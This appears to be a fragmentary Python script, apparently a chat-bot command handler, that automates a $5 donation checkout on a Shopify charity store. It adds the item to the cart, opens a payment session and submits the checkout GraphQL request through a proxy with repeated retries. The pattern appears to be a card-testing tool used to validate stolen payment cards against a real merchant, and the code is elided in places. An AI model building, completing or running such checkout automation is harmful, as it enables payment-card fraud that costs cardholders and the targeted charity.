...
async def sh(message):
    ...
    async with aiohttp.ClientSession() as r:
        url = "https://dogoodshop.org/cart/add.js"
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://dogoodshop.org',
            'referer': 'https://dogoodshop.org/products/donate',
        ...
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'data-product-id': '8733746759',
            'id': '41442304852077',
            'amount': '$5',
            'product-id': '8733746759',
...
"""
        ...
        async with r.get('https://dogoodshop.org/cart.js', headers=headers, proxy=PROX) as response:
...
"""
        ...
        json_data = {
            ...
            'payment_session_scope': 'dogoodshop.org',
        }
...
"""
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/41442304852077',
                                        'variantId': 'gid://shopify/ProductVariant/41442304852077',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://dogoodshop.org/checkouts/cn/{tok}',
                    'pageId': '06b705ac-8908-424D-4F51-31D308CE29FE',
                },
            },
            'operationName': 'SubmitForCompletion',
        }

        async with r.post('https://dogoodshop.org/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, proxy=PROX) as response:
            raw = await response.text()
            try:
                res_json = json.loads(raw)
...
"""
            ...
            for _ in range(max_retries):
                async with r.post('https://dogoodshop.org/checkouts/unstable/graphql',params=params,headers=headers,json=json_data, proxy=PROX) as final_response:
